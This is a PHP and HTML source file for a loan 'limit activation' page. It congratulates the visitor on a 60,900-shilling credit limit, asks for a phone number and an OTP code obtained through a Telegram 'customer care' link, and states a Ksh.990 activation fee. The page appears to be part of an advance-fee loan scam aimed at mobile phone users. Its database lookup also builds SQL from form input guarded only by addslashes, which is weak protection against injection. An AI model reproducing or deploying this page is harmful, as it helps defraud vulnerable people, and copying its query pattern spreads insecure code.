<?php
	require "function.php";

	check_login();

	if($_SERVER['REQUEST_METHOD'] == "POST")
	{
		$phoneNo = addslashes ($_POST['phoneNo']);
		$code = addslashes ($_POST['code']);

		$query = "SELECT * FROM users where phoneNo = '$phoneNo' && code = '$code' limit 1";

		$result = mysqli_query($con,$query);
		
		//print_r($result);
		if(mysqli_num_rows($result) > 0){
			$row = mysqli_fetch_assoc($result);
			$_SESSION['info'] = $row;

			header("location: status.php");
			die;
		}
		else{
			$error = "check your OTP code and retry, if unresolved contact our customer service";

		}
		
	}
?>

<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>activation</title>
	<?php require "style.php";?>
</head>
<body>
	<?php require "header.php";?>

	<article class="main-body">
			<div class="head-b">
				<a href="logout.php" class="h-buttons">HOME</a>
			</div>
			<!-- <div><a href=""></div> -->
			<section class="upper-b t-cong">
				<div class="head-h">
					<h2><span ><strong>Your Credit Score Status</strong></span></h2>
				</div>
				<div class="t-cong1" style="margin: 0; padding: 0; ">
				
					<p>
						<strong><span>CONGRATULATION!</span></p>  <p><?php echo $_SESSION['info']['fullnames']?></strong>, your credit score for your number <strong>0<?php echo $_SESSION['info']['phoneNo']?></strong> allows you upto a limit of <strong><span class="no-members">60,900 shillings</span></strong>.
					</p>
				</div>
				<br>
			</section>
			<section class="t-cong2">
					<div>
						<h3 class="head-h2"><strong><i>To Activate Your New Limit:</i></strong></h3>
					</div>
					<div>
						<ul>
							<li>
								<i>Enter your Ticket Number</span></i>
							</li>
							<li>
								<i>Get and enter you OTP code</i>
							</li>
							<li>
								<i>click <span>activate</span></i>
							</li>
						</ul>
					</div>
					<br>
				</section>
				<div class=" t-cong3">
					
					<?php 

						if(!empty($error)) {
							echo "<div>".$error."</div>";
						}

					?>
						
				</div>
			<section class="t-bbody">
				<form method="post" class="t-body">
					<fieldset  class="form t-form">
						<legend><strong></strong></legend>
						<label>Phone number:</label><br>
						<input type="tel" name="phoneNo" id="phoneNo" pattern="[0]{1}[1 7]{1}[0 1 2 4 5 6 9]{1}[0-9]{4}[0-9]{3}" placeholder="0710 000 000/0100 000 000" required><br><br>
						<label>Enter Your Code:<a href="https://t.me/zuri_customercare"><br><i>get code</i></a></label><br>
						<input type="num" id="code" name="code" placeholder="enter your OTP code" required><br>
				
						<button class="buttons" type="post">activate</button>
						<br><br><br>

					</fieldset><br>
				</form>

				<div>
					<p><i><strong>NOTE:</strong>This process will only Cost you <span>Ksh.990</span> which goes with minimum loan of <span>Ksh.17,500</span> to a maximum loan increment of <span>Ksh.75,000</span>. Your limit increment depend on the period you have been using your line and more importantly the your <span>credit score</span>.</i></p>
				</div>
			</section>
	</article>
	<?php require "footer.php";?>
</body>
</html>